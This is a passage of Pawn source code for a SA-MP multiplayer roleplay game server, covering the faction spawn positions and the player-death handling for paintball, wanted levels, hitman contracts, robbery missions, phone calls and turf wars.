            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            SetPlayerVirtualWorld(playerid,55);
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)//Police  spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid,6);
            SetPlayerPosEx(playerid, 232.2978,73.3325,1005.0391);
            Mahal[playerid] = 5;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            SetPlayerFacingAngle(playerid, 270.0);
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)//FBI spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid,3);
            SetPlayerPosEx(playerid, 299.7097,183.1322,1007.1719);
            SetPlayerFacingAngle(playerid, 90);
            Mahal[playerid] = 6;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)//National Guard spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 0);
            SetPlayerPosEx(playerid, 224.2563,1872.6023,13.7344);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)//Fire/Ambulance spawn
        {
            SetPlayerToTeamColor(playerid);
            SetPlayerPosEx(playerid, 1495.969726,1307.056152,1093.289062);
            SetPlayerVirtualWorld(playerid,71);
            SetPlayerInterior(playerid,3);
            Mahal[playerid] = 70;
            SetPlayerFacingAngle(playerid,90);
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5)//Silence Mafia spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 0);
            SetPlayerPos(playerid, 725.933,-1450.783,17.256);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14)//FNF spawn
        {
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerPos(playerid, 1455.380,751.396,10.335);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)//Triads spawn
        {
            SetPlayerVirtualWorld(playerid, 4006);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 5);
            SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
            Mahal[playerid] = 9;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8) //Hitman spawn
        {
            SetPlayerToTeamColor(playerid);
            SetPlayerPosEx(playerid, 1701.744262,-1667.856689,20.218750);
            SetPlayerVirtualWorld(playerid, 54);
            Mahal[playerid] = 10;
            SetPlayerInterior(playerid,18);
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9) //News spawn
        {
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid,3);
            SetPlayerVirtualWorld(playerid,72);
            SetPlayerPosEx(playerid, 1495.969726,1307.056152,1093.289062);
            SetPlayerFacingAngle(playerid,90);
            Mahal[playerid] = 9999;
			SetTimerEx("GiveNewsCamera",300, false, "i", playerid);
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)//StormMen spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid,0);
            SetPlayerPos(playerid, 2793.370,-1087.376,30.289);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)//SFPD spawn
        {
		// EDIT SFPD //
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid,0);
            SetPlayerPosEx(playerid, -1593.108,716.279,-5.648);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19)//The Racers spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 9);
            SetPlayerPosEx(playerid, 260.699951,1238.204223,1084.257812);
            Mahal[playerid] = 214;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)//Dangerous Tigers Family spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
			SetPlayerInterior(playerid, 0);
            SetPlayerPos(playerid, 2637.1936,2352.0090,10.8203);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)//LegendaryMen Family spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 0);
            SetPlayerPos(playerid, 1122.7065,-2037.0063,69.8942);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        if (PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)//Tow Car Company spawn
        {
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerPosEx(playerid, 912.2000,-1234.9801,17.2109);
            SetPlayerFacingAngle(playerid, 4.6505);
            SetPlayerInterior(playerid,0);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
if (PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pLeader] == 17)//Staff spawn
{
    SetPlayerVirtualWorld(playerid, 934);
SetPlayerToTeamColor(playerid);
SetPlayerPosEx(playerid, 225.776153,1023.474426,1084.011840);
SetPlayerFacingAngle(playerid, 177.638259);
SetPlayerInterior(playerid,7);
Mahal[playerid] = 199;
TooHouse[playerid] = 934;
TooBiz[playerid] = 9999;
    return 1;
}
if (PlayerInfo[playerid][pClan] == 1)//TT spawn
{
			SetPlayerVirtualWorld(playerid, 10001);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 7);
            SetPlayerPosEx(playerid, 225.938522,1023.249267,1084.012451);
            SetPlayerFacingAngle(playerid, 359.526885);
            Mahal[playerid] = 212;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
}
if (PlayerInfo[playerid][pClan] == 3)//Evil spawn
{
			SetPlayerVirtualWorld(playerid, 10003);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 18);
            SetPlayerPosEx(playerid, 1702.380859,-1668.129882,20.218750);
            SetPlayerFacingAngle(playerid, 264.264129);
            Mahal[playerid] = 2145;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
}
if (PlayerInfo[playerid][pClan] == 2)// GG spawn (Edit)
{
            SetPlayerVirtualWorld(playerid, 10002);
            SetPlayerToTeamColor(playerid);
            SetPlayerInterior(playerid, 18);
            SetPlayerPosEx(playerid, 1702.380859,-1668.129882,20.218750);
            SetPlayerFacingAngle(playerid, 264.264129);
            Mahal[playerid] = 357;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
}
        if(IsAnTaxi(playerid) || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10) //Taxi Cab Company spawn
        {
            if(TaxiSpawn[playerid] == 0)
            {
                SetPlayerToTeamColor(playerid);
                SetPlayerPosEx(playerid, 1495.969726,1307.056152,1093.289062);
                SetPlayerFacingAngle(playerid,90);
                Mahal[playerid] = 14;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SetPlayerInterior(playerid,3);
                SetPlayerVirtualWorld(playerid, 70);
            }
            else if(TaxiSpawn[playerid] == 1)
            {
                SetPlayerVirtualWorld(playerid, 0);
                SetPlayerToTeamColor(playerid);
                SetPlayerPosEx(playerid, 1755.6456,-1894.1962,13.5566);
                SetPlayerFacingAngle(playerid, 180);
                SetPlayerInterior(playerid,0);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
            }
            return 1;
        }
        if(IsAnInstructor(playerid) || PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) //Driving/Flying School spawn
        {
            if(SchoolSpawn[playerid] == 0)
            {
                SetPlayerVirtualWorld(playerid, 0);
                SetPlayerToTeamColor(playerid);
                SetPlayerPosEx(playerid, 1174.0846,1351.0155,10.9219);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SetPlayerFacingAngle(playerid, 180);
                SetPlayerInterior(playerid,0);
            }
            else if(SchoolSpawn[playerid] == 1)
            {
                SetPlayerVirtualWorld(playerid, 0);
                SetPlayerToTeamColor(playerid);
                SetPlayerPosEx(playerid, 413.9613,2536.5122,19.1484);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SetPlayerFacingAngle(playerid, 180);
                SetPlayerInterior(playerid,0);
            }
            return 1;
        }
        if ((gTeam[playerid]) == TEAM_CIV)
        {
           SetPlayerVirtualWorld(playerid, 0);
            SetPlayerToTeamColor(playerid);
            SetPlayerPos(playerid,1219.2526,-1813.0323,16.6145,4.0966);
            SetPlayerFacingAngle(playerid, 0);
            SetPlayerInterior(playerid,0);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
/*public OnPlayerDeath(playerid, killerid, reason)
{

    PlayDeathingCamera[playerid] = true;
    if(OnRob[playerid] == true && RobLeader[playerid] == false)
    {
        SCM(playerid,COLOR_ALI,"You have been died, and failed on your mission.");
        new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~%s has been died",PINFO[playerid][pName]);
        GameTextForPlayer(RobDriver[playerid],strrali,9000,0);
        if(CP[RobDriver[playerid]] >= 2002001 && CP[RobDriver[playerid]] <= 2002009){DisablePlayerCheckpoint(RobDriver[playerid]);OnCheckpoint[RobDriver[playerid]] = 0;CP[RobDriver[playerid]] = 0;}
        OnRob[RobDriver[playerid]] = false;
        RobLeader[RobDriver[playerid]] = false;
        for(new i;i<RobMemberCount[RobDriver[playerid]];i++)
        {
            if(RobMember[RobDriver[playerid]][i] != playerid)
            {
                GameTextForPlayer(RobMember[RobDriver[playerid]][i],strrali,9000,0);
                OnRob[RobMember[RobDriver[playerid]][i]] = false;
                RobDriver[RobMember[RobDriver[playerid]][i]] = INVALID_PLAYER_ID;
            }
        }
        RobMemberCount[RobDriver[playerid]] = 0;
        for(new i;i<100;i++)
        {
            RobMember[RobDriver[playerid]][i] = INVALID_PLAYER_ID;
        }
        GameTextForPlayer(playerid,strrali,9000,0);
        OnRob[playerid] = false;
        RobDriver[playerid] = INVALID_PLAYER_ID;
    }
    if(OnRob[playerid] == true && RobLeader[playerid] == true)
    {
        SCM(playerid,COLOR_ALI,"You have been died, and failed on your mission.");
        new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~%s has been died",PINFO[playerid][pName]);
        for(new i;i<RobMemberCount[playerid];i++)
        {
            GameTextForPlayer(RobMember[playerid][i],strrali,9000,0);
            OnRob[RobMember[playerid][i]] = false;
            RobDriver[RobMember[playerid][i]] = INVALID_PLAYER_ID;
        }
        OnRob[playerid] = false;
        if(CP[playerid] >= 2002001 && CP[playerid] <= 2002009){DisablePlayerCheckpoint(playerid);OnCheckpoint[playerid] = 0;CP[playerid] = 0;}
        RobLeader[playerid] = false;
        RobMemberCount[playerid] = 0;
        for(new i;i<100;i++)
        {
            RobMember[playerid][i] = INVALID_PLAYER_ID;
        }
        RobDriver[playerid] = INVALID_PLAYER_ID;
    }
    ResetPlayerTofang(playerid);
    ManMitoonamSkin[playerid] = 1;
    if(IsPlayerConnected(Mobile[playerid]))
    {
        if(Mobile[playerid] != 9999 && Mobile[Mobile[playerid]] != 9999)
        {
                    new caller = Mobile[playerid];
                    if(IsPlayerConnected(caller))
                    {
                        SendClientMessage(playerid,  COLOR_PURPLE, "The line just went dead ....(you are Death)");
                        SendClientMessage(caller,  COLOR_PURPLE, "The line just went dead ....(your caller Death)");
                        SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                        RemovePlayerAttachedObject(caller, 0);
                        RemovePlayerAttachedObject(playerid, 0);
                        CellTime[playerid] = 90;
                        CellTime[caller] = 90;
                        Mobile[playerid] = 9999;
                        Mobile[caller] = 9999;
                        TimerRingTone[playerid] = 0;
                        TimerRingTone[caller] = 0;
                        PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad Save she
                    }
        }
        if(Mobile[playerid] != 9999 && CallWaiting[playerid] == 9999)
        {
                    new caller = Mobile[playerid];
                    if(IsPlayerConnected(caller))
                    {
                        SendClientMessage(caller,  COLOR_PURPLE, "The line just went dead ....(your caller Death)");
                        SendClientMessage(playerid,  COLOR_PURPLE, "The line just went dead ....(you are Death)");
                        RemovePlayerAttachedObject(caller, 0);
                        RemovePlayerAttachedObject(playerid, 0);
                        CellTime[playerid] = 90;
                        CellTime[caller] = 90;
                        Mobile[playerid] = 9999;
                        Mobile[caller] = 9999;
                        TimerRingTone[playerid] = 0;
                        TimerRingTone[caller] = 0;
                        PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
                        CallWaiting[caller] = 9999;
                    }
        }
        if(Mobile[playerid] == 9999 && CallWaiting[playerid] != 9999)
        {
                    new caller = CallWaiting[playerid];
                    if(IsPlayerConnected(caller))
                    {
                        SendClientMessage(caller,  COLOR_PURPLE, "The line just went dead ....(your caller target Death)");
                        SendClientMessage(playerid,  COLOR_PURPLE, "The line just went dead ....(you are Death)");
                        RemovePlayerAttachedObject(caller, 0);
                        SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                        CellTime[playerid] = 90;
                        CellTime[caller] = 90;
                        Mobile[playerid] = 9999;
                        Mobile[caller] = 9999;
                        TimerRingTone[playerid] = 0;
                        TimerRingTone[caller] = 0;
                        PlayerInfo[playerid][pSpeaker] = 0;//nemikhad
                        PlayerInfo[caller][pSpeaker] = 0;
                        CallWaiting[playerid] = 9999;
                    }
        }
    }
    else
    {
        if(Mobile[playerid] != 9999)
        {
                    SendClientMessage(playerid,  COLOR_PURPLE, "The line just went dead ....(you are Death)");
                    RemovePlayerAttachedObject(playerid, 0);
                    CellTime[playerid] = 90;
                    Mobile[playerid] = 9999;
                    TimerRingTone[playerid] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
        }
    }
    if(CP[playerid] == 1 && PlayerInfo[playerid][pJob] == 5)
    {
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        SCM(playerid,COLOR_LIGHTBLUE,"You died and lost on mission.");
        CP[playerid] = 0;
    }
    HealthAllowedForPlayer[playerid] = 0;
    SetPlayerColor(playerid,COLOR_GRAD2);
    return 1;
}*/
public OnPlayerDeath(playerid, killerid, reason)
{
    IsAtTelePhoneSabet[playerid] = false;
    if(OnPaintBall[playerid] != 0)
        {
            if(killerid != INVALID_PLAYER_ID)
            {
                PaintBallKills[killerid] ++;
                new sttr[256];format(sttr,sizeof sttr,"You have %i kills now.",PaintBallKills[killerid]);SCM(killerid,COLOR_WHITE,sttr);
                if(PaintBallKills[killerid] > PaintBallLeadKills)
                {
                    new string[256];
                    new killer[MAX_PLAYER_NAME];
                    PaintBallLeadKills = PaintBallKills[killerid];
                    GetPlayerName(killerid, killer, sizeof(killer));
                    for(new i = 0; i < LastPID; i++)
                    {
                        if(IsPlayerConnected(i))
                        {
                            if(OnPaintBall[i] != 0)
                            {
                                format(string, sizeof(string), "%s is in the lead with %d Kills.",killer,PaintBallLeadKills);
                                SendClientMessage(i, COLOR_WHITE, string);
                                PaintBallWinner = killerid;
                            }
                        }
                    }
                }
            }
            return 1;
    }
    SetPlayerColor(playerid,COLOR_GRAD2);
    Mahal[playerid] = 9999;
    TooHouse[playerid] = 9999;
    TooBiz[playerid] = 9999;
    if(GetPlayerWantedLevel(playerid) >= 1)
        {
            new string[256];
            new price = GetPlayerWantedLevel(playerid) * 120;
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if((gTeam[i] == TEAM_COP || IsACop(i)) && GetDistanceBetweenPlayers(playerid, i) <= 30 && OnDuty[i] != 0)
                    {
                        format(string, sizeof(string), "~w~Running Suspect~r~Killed~n~Bonus~g~$%d", price);
                        GameTextForPlayer(i, string, 5000, 1);
                        GivePlayerPool(i, price);
                        PlayerPlaySound(i, 1058, 0.0, 0.0, 0.0);
                        GivePlayerPool(playerid, - price);
                        PlayerInfo[playerid][pWantedDeaths] += 1;
                        SaveKonVal(playerid, "pWantedDeaths", PlayerInfo[playerid][pWantedDeaths]);
                        if(GetPlayerWantedLevel(playerid) <= 6) PlayerInfo[playerid][pJailTime] = (GetPlayerWantedLevel(playerid))*(1000);
                        else PlayerInfo[playerid][pJailTime] = 6000;
                        SaveKonVal(playerid, "pJailTime", PINFO[playerid][pJailTime]);
                        SetPlayerWantedLevel(playerid, 0);
                        format(string, sizeof(string), "You are in Jail for %d Seconds and lose $%d because of running away and getting shot by the Officer %s.", PlayerInfo[playerid][pJailTime], price, PINFO[i][pName]);
                        SendClientMessage(playerid, COLOR_LIGHTRED, string);
                        break;
                    }
                }
            }
        }
    if(!IsPlayerNPC(playerid))
    {
        if(gettime() - StartDeathTick[playerid] < 5) //5 seconds
        {
            CountDeaths[playerid] ++;
            if(CountDeaths[playerid] == 10)
            {
                CountDeaths[playerid] = 0;
                return 1;
            }
        }
        else CountDeaths[playerid] = 1;
        StartDeathTick[playerid] = gettime();
    }
    PlayDeathingCamera[playerid] = true;
    PlayerOnDeathing[playerid] = true;
    /*if(killerid != INVALID_PLAYER_ID)
    {
        new str[256],wepname[60];
        GetWeaponName(reason, wepname, 60);
        format(str, 256, "Debug: Killed by %s(%i) with gun %s(%i)",PINFO[killerid][pName], killerid, wepname, reason);
        SCM(playerid,COLOR_Good,str);
    }
    else
    {
        new str[256],wepname[60];
        GetWeaponName(reason, wepname, 60);
        format(str, 256, "Debug: Killed by Server with gun %s(%i)", wepname, reason);
        SCM(playerid,COLOR_Good,str);
    }*/
    new hiter = INVALID_PLAYER_ID;
    if(killerid != INVALID_PLAYER_ID)
    {
        if(PINFO[killerid][pMember] == 8 || PINFO[killerid][pLeader] == 8)
        {
            if(AgentHiterID[playerid] == killerid)
            {
                if(AgentHitID[killerid] == playerid)
                {
                    new strlol[256];
                    format(strlol,256,"You have been killed your contract successfully, Prize: $%s",FormatNumber(PINFO[playerid][pHeadValue]));
                    SCM(killerid,COLOR_HITMAN,strlol);
                    PINFO[killerid][pGetHitTime] = 0;
                    SaveKonVal(killerid, "pGetHitTime", 0);
                    GivePlayerPool(killerid,PINFO[playerid][pHeadValue]);
                    AgentHitID[killerid] = INVALID_PLAYER_ID;
                    AgentHiterID[playerid] = INVALID_PLAYER_ID;
                    //SaveAccount(killerid);
                    PINFO[playerid][pHeadValue] = 0;
                    SaveKonVal(playerid, "pHeadValue", 0);
                    //SaveAccount(playerid);
                    hiter = killerid;
                }
            }
        }
    }
    if(OnRob[playerid] == true && RobLeader[playerid] == false)
    {
        SCM(playerid,COLOR_ALI,"You have been died, and failed on your mission.");
        new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~%s has been died",PINFO[playerid][pName]);
        GameTextForPlayer(RobDriver[playerid],strrali,9000,0);
        if(CP[RobDriver[playerid]] >= 2002001 && CP[RobDriver[playerid]] <= 2002009){DisablePlayerCheckpoint(RobDriver[playerid]);OnCheckpoint[RobDriver[playerid]] = 0;CP[RobDriver[playerid]] = 0;}
        OnRob[RobDriver[playerid]] = false;
        RobLeader[RobDriver[playerid]] = false;
        for(new i;i<RobMemberCount[RobDriver[playerid]];i++)
        {
            if(RobMember[RobDriver[playerid]][i] != playerid)
            {
                GameTextForPlayer(RobMember[RobDriver[playerid]][i],strrali,9000,0);
                OnRob[RobMember[RobDriver[playerid]][i]] = false;
                RobDriver[RobMember[RobDriver[playerid]][i]] = INVALID_PLAYER_ID;
            }
        }
        RobMemberCount[RobDriver[playerid]] = 0;
        for(new i;i<100;i++)
        {
            RobMember[RobDriver[playerid]][i] = INVALID_PLAYER_ID;
        }
        GameTextForPlayer(playerid,strrali,9000,0);
        OnRob[playerid] = false;
        RobDriver[playerid] = INVALID_PLAYER_ID;
    }
    if(OnRob[playerid] == true && RobLeader[playerid] == true)
    {
        SCM(playerid,COLOR_ALI,"You have been died, and failed on your mission.");
        new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~%s has been died",PINFO[playerid][pName]);
        for(new i;i<RobMemberCount[playerid];i++)
        {
            GameTextForPlayer(RobMember[playerid][i],strrali,9000,0);
            OnRob[RobMember[playerid][i]] = false;
            RobDriver[RobMember[playerid][i]] = INVALID_PLAYER_ID;
        }
        OnRob[playerid] = false;
        if(CP[playerid] >= 2002001 && CP[playerid] <= 2002009){DisablePlayerCheckpoint(playerid);OnCheckpoint[playerid] = 0;CP[playerid] = 0;}
        RobLeader[playerid] = false;
        RobMemberCount[playerid] = 0;
        for(new i;i<100;i++)
        {
            RobMember[playerid][i] = INVALID_PLAYER_ID;
        }
        RobDriver[playerid] = INVALID_PLAYER_ID;
    }
    if(IsPlayerConnected(killerid) && killerid != INVALID_PLAYER_ID)
    {
        PINFO[killerid][pKills] ++;
        SaveKonVal(killerid, "pKills", PINFO[killerid][pKills]);
        //SaveAccount(killerid);
    }
    IsPlayerDeath[playerid] = true;
	InModShop[playerid] = 0;
    ResetPlayerTofang(playerid);
    ManMitoonamSkin[playerid] = 1;
    if(IsPlayerConnected(Mobile[playerid]))
    {
        if(Mobile[playerid] != 9999 && Mobile[Mobile[playerid]] != 9999)
        {
                    new caller = Mobile[playerid];
                    SendClientMessage(playerid,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(To Mordi)");
                    SendClientMessage(caller,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(Ou Mord)");
                    SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                    RemovePlayerAttachedObject(caller, 0);
                    RemovePlayerAttachedObject(playerid, 0);
                    CellTime[playerid] = 90;
                    CellTime[caller] = 90;
                    Mobile[playerid] = 9999;
                    Mobile[caller] = 9999;
                    TimerRingTone[playerid] = 0;
                    TimerRingTone[caller] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
        }
        if(Mobile[playerid] != 9999 && CallWaiting[playerid] == 9999)
        {
                    new caller = Mobile[playerid];
                    SendClientMessage(caller,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(Ou Mord)");
                    SendClientMessage(playerid,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(To Mordi)");
                    RemovePlayerAttachedObject(caller, 0);
                    RemovePlayerAttachedObject(playerid, 0);
                    CellTime[playerid] = 90;
                    CellTime[caller] = 90;
                    Mobile[playerid] = 9999;
                    Mobile[caller] = 9999;
                    TimerRingTone[playerid] = 0;
                    TimerRingTone[caller] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
                    CallWaiting[caller] = 9999;
        }
        if(Mobile[playerid] == 9999 && CallWaiting[playerid] != 9999)
        {
                    new caller = CallWaiting[playerid];
                    SendClientMessage(caller,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(Ou Mord)");
                    SendClientMessage(playerid,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(To Mordi)");
                    RemovePlayerAttachedObject(caller, 0);
                    SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                    CellTime[playerid] = 90;
                    CellTime[caller] = 90;
                    Mobile[playerid] = 9999;
                    Mobile[caller] = 9999;
                    TimerRingTone[playerid] = 0;
                    TimerRingTone[caller] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//nemikhad
                    PlayerInfo[caller][pSpeaker] = 0;//nemikhad
                    CallWaiting[playerid] = 9999;
        }
    }
    else
    {
        if(Mobile[playerid] != 9999)
        {
                    SendClientMessage(playerid,  COLOR_PURPLE, "Mokalemeye shoma Payan gereft ....(To Mordi)");
                    RemovePlayerAttachedObject(playerid, 0);
                    CellTime[playerid] = 90;
                    Mobile[playerid] = 9999;
                    TimerRingTone[playerid] = 0;
                    PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
        }
    }
    if(AntiKhoonHack[playerid] && PINFO[playerid][pTut] == 1 && gPlayerLogged[playerid] == 1)
    {
        PlayerRespawned[playerid] = 1;
        KillTimer(AntiKhoonHack[playerid]);
    }
	if(killerid != INVALID_PLAYER_ID)
	{
		new famil,mfgsfggff[512],strlol[512];
        if(PlayerInfo[killerid][pLeader]) famil = PlayerInfo[killerid][pLeader];
        else famil = PlayerInfo[killerid][pMember];
        if(ServerTurf != 9999)
        {
			if(PlayerInfo[playerid][pMember] == TurfAttacker[ServerTurf] || PlayerInfo[playerid][pLeader] == TurfAttacker[ServerTurf])
			{
				if(IsPlayerInTurf(playerid,ServerTurf) && IsPlayerInTurf(killerid,ServerTurf) && famil != TurfAttacker[ServerTurf])
				{
                    KillsKhod[killerid] ++;
                    DeathsAttacker[playerid] ++;
                    KillsKhodTurf[ServerTurf] ++;
                    DeathsAttackerTurf[ServerTurf] ++;
                    format(strlol,sizeof(strlol),"[Turfs]: Times Deaths: %i,Times Kills: %i, score: %i | %02d:%02d",DeathsAttacker[playerid],KillsAttacker[playerid],KillsAttacker[playerid] - DeathsAttacker[playerid],TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
                    SCM(playerid,COLOR_JOB,strlol);
					format(mfgsfggff,sizeof(mfgsfggff),"[Turfs]: Times Deaths: %i,Times Kills: %i, score: %i | %02d:%02d",DeathsKhod[killerid],KillsKhod[killerid],KillsKhod[killerid] - DeathsKhod[killerid],TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
                    SCM(killerid,COLOR_JOB,mfgsfggff);
                }
            }
            if(PlayerInfo[playerid][pMember] == TurfKhod[ServerTurf] || PlayerInfo[playerid][pLeader] == TurfKhod[ServerTurf])
            {
                if(IsPlayerInTurf(playerid,ServerTurf) && IsPlayerInTurf(killerid,ServerTurf) && famil != TurfKhod[ServerTurf])
                {
					KillsAttacker[killerid] ++;
	                KillsAttackerTurf[ServerTurf] ++;
	                DeathsKhod[playerid] ++;
    	            DeathsKhodTurf[ServerTurf] ++;
                    format(strlol,sizeof(strlol),"[Turfs]: Times Deaths: %i,Times Kills: %i, score: %i | %02d:%02d",DeathsKhod[playerid],KillsKhod[playerid],KillsKhod[playerid] - DeathsKhod[playerid],TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
                    SCM(playerid,COLOR_JOB,strlol);
					format(mfgsfggff,sizeof(mfgsfggff),"[Turfs]: Times Deaths: %i,Times Kills: %i, score: %i | %02d:%02d",DeathsAttacker[killerid],KillsAttacker[killerid],KillsAttacker[killerid] - DeathsAttacker[killerid],TurfTime[ServerTurf]/60,TurfTime[ServerTurf]-(floatround(TurfTime[ServerTurf]/60)*60));
                    SCM(killerid,COLOR_JOB,mfgsfggff);
                }
            }
        }
    }
    if(CP[playerid] == 1 && PlayerInfo[playerid][pJob] == 5)
    {
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        SCM(playerid,COLOR_LIGHTBLUE,"You died and lost on mission.");
        CP[playerid] = 0;
    }
    HealthAllowedForPlayer[playerid] = 0;
    MedicBill[playerid] = 1;
    new name[MAX_PLAYER_NAME];
    new Float:px,Float:py,Float:pz;
        gPlayerSpawned[playerid] = 0;
        GetPlayerName(playerid, name, sizeof(name));
        GetPlayerPos(playerid, px, py, pz);
    if(killerid != INVALID_PLAYER_ID && killerid != playerid && hiter != killerid)
    {
        if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER)
        {
                if(PlayerInfo[killerid][pJailTime] <= 0)
                {
                    if(IsACop(killerid))
                    {
                        return 1;
                    }
                    else if(IsAMemberC(playerid) && IsAMemberC(killerid))
                    {
                        return 1;
                    }
                    else
                    {
                        if(Ghatel[playerid] != killerid)
                        {
                            new strali[256];
                            format(strali, 256, " %s murdered you. You have 60 seconds to announce the police. Use /call 110.", PINFO[killerid][pName]);
